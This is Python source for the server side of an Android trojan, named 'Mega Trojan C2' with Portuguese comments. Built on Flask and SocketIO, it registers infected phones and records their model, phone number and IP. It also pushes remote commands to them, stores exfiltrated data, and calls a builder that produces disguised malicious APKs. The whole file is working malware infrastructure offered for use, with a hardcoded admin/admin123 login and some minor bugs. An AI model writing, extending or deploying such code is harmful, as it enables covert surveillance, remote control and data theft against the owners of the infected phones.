#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Mega Trojan C2 — Servidor de controlo
Flask + WebSockets + SQLite
"""

import os
import sqlite3
import hashlib
import secrets
import json
import time
import threading
from datetime import datetime
from flask import Flask, request, jsonify, session, render_template, redirect, url_for
from flask_socketio import SocketIO, emit, join_room, leave_room
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_hex(32)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

DB_PATH = os.path.join(os.path.dirname(__file__), 'c2.db')

# ==================== BASE DE DADOS ====================

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    cursor = conn.cursor()
    
    # Tabela de utilizadores do painel
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Tabela de dispositivos infetados
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS devices (
            device_id TEXT PRIMARY KEY,
            model TEXT,
            android_version TEXT,
            phone_number TEXT,
            ip_address TEXT,
            last_seen TEXT,
            status TEXT DEFAULT 'online',
            battery_level INTEGER DEFAULT 0,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Tabela de comandos pendentes
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            command TEXT,
            arguments TEXT,
            status TEXT DEFAULT 'pending',
            result TEXT,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Tabela de dados recolhidos
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS collected_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            data_type TEXT,
            content TEXT,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Utilizador admin padrão: admin / admin123
    cursor.execute("SELECT COUNT(*) FROM users WHERE username = 'admin'")
    if cursor.fetchone()[0] == 0:
        password_hash = generate_password_hash('admin123')
        cursor.execute(
            "INSERT INTO users (username, password_hash) VALUES (?, ?)",
            ('admin', password_hash)
        )
    
    conn.commit()
    conn.close()

init_db()

# ==================== AUTENTICAÇÃO ====================

@app.route('/')
def index():
    if 'username' in session:
        return redirect(url_for('panel'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        
        conn = get_db()
        user = conn.execute(
            "SELECT * FROM users WHERE username = ?", 
            (username,)
        ).fetchone()
        conn.close()
        
        if user and check_password_hash(user['password_hash'], password):
            session['username'] = username
            return redirect(url_for('panel'))
        
        return render_template('login.html', error='Credenciais inválidas')
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('username', None)
    return redirect(url_for('login'))

@app.route('/panel')
def panel():
    if 'username' not in session:
        return redirect(url_for('login'))
    return render_template('panel.html')

# ==================== API ====================

def require_login(f):
    def wrapper(*args, **kwargs):
        if 'username' not in session:
            return jsonify({'error': 'Não autenticado'}), 401
        return f(*args, **kwargs)
    wrapper.__name__ = f.__name__
    return wrapper

@app.route('/api/devices')
@require_login
def api_devices():
    conn = get_db()
    devices = conn.execute(
        "SELECT * FROM devices ORDER BY last_seen DESC"
    ).fetchall()
    conn.close()
    return jsonify([dict(d) for d in devices])

@app.route('/api/devices/<device_id>/data')
@require_login
def api_device_data(device_id):
    conn = get_db()
    data = conn.execute(
        "SELECT * FROM collected_data WHERE device_id = ? ORDER BY created_at DESC LIMIT 500",
        (device_id,)
    ).fetchall()
    conn.close()
    return jsonify([dict(d) for d in data])

@app.route('/api/devices/<device_id>/send_command', methods=['POST'])
@require_login
def api_send_command(device_id):
    command = request.json.get('command')
    arguments = request.json.get('arguments', '{}')
    
    conn = get_db()
    cursor = conn.execute(
        "INSERT INTO commands (device_id, command, arguments) VALUES (?, ?, ?)",
        (device_id, command, json.dumps(arguments))
    )
    command_id = cursor.lastrowid
    conn.commit()
    conn.close()
    
    # Envia comando via WebSocket
    socketio.emit('command', {
        'id': command_id,
        'command': command,
        'arguments': json.dumps(arguments)
    }, room=device_id)
    
    return jsonify({'status': 'sent', 'command_id': command_id})

@app.route('/api/generate_apk', methods=['POST'])
@require_login
def api_generate_apk():
    apk_name = request.json.get('apk_name', 'app')
    c2_url = request.json.get('c2_url', '')
    icon_type = request.json.get('icon_type', 'camera')
    
    # Importa o gerador
    sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'gerador'))
    from gerador_apk import generate_apk
    
    apk_path = generate_apk(apk_name, c2_url, icon_type)
    
    if apk_path:
        return jsonify({'status': 'success', 'apk_path': apk_path})
    return jsonify({'status': 'error', 'message': 'Falha ao gerar APK'}), 500

# ==================== WebSocket para Dispositivos ====================

@socketio.on('register')
def handle_register(data):
    """Dispositivo regista-se no C2"""
    device_id = secrets.token_hex(16)
    
    conn = get_db()
    conn.execute('''
        INSERT INTO devices (device_id, model, android_version, phone_number, ip_address, last_seen)
        VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
    ''', (
        device_id,
        data.get('model', 'Unknown'),
        data.get('android_version', 'Unknown'),
        data.get('phone_number', 'Unknown'),
        request.remote_addr
    ))
    conn.commit()
    conn.close()
    
    join_room(device_id)
    emit('registered', {'device_id': device_id})
    print(f"[+] Novo dispositivo registado: {device_id}")

@socketio.on('device_hello')
def handle_device_hello(data):
    """Dispositivo reconecta com ID existente"""
    device_id = data.get('device_id')
    if device_id:
        join_room(device_id)
        
        conn = get_db()
        conn.execute(
            "UPDATE devices SET last_seen = CURRENT_TIMESTAMP, status = 'online' WHERE device_id = ?",
            (device_id,)
        )
        conn.commit()
        conn.close()
        
        # Envia comandos pendentes
        pending = conn.execute(
            "SELECT * FROM commands WHERE device_id = ? AND status = 'pending'",
            (device_id,)
        ).fetchall()
        
        for cmd in pending:
            emit('command', {
                'id': cmd['id'],
                'command': cmd['command'],
                'arguments': cmd['arguments']
            }, room=device_id)
        
        conn.close()

@socketio.on('command_result')
def handle_command_result(data):
    """Dispositivo devolve resultado de comando"""
    conn = get_db()
    conn.execute(
        "UPDATE commands SET status = 'completed', result = ? WHERE id = ?",
        (json.dumps(data.get('result')), data.get('command_id'))
    )
    conn.commit()
    conn.close()

@socketio.on('data_exfil')
def handle_data_exfil(data):
    """Dispositivo envia dados recolhidos"""
    conn = get_db()
    conn.execute(
        "INSERT INTO collected_data (device_id, data_type, content) VALUES (?, ?, ?)",
        (data.get('device_id'), data.get('data_type'), json.dumps(data.get('content')))
    )
    conn.commit()
    conn.close()

if __name__ == '__main__':
    print("[+] Mega Trojan C2 iniciado em :5000")
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
